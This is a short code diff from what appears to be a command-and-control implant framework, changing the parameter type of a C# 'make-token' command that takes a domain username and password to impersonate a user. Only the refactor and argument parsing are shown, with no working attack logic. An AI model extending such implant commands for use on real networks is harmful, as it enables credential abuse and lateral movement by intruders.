@@ -16,7 +16,7 @@ namespace Commands
     public class MakeTokenCommand : AgentCommand
     {
         public override string Name => "make-token";
-        public override void InnerExecute(AgentTask task, Agent.Models.Agent agent, AgentTaskResult result, CommModule commm)
+        public override void InnerExecute(AgentTask task, Agent.Models.Agent agent, AgentTaskResult result, MessageManager commm)
         {
             // make-token DOMAIN\Username Password
             var userDomain = task.SplittedArgs[0];
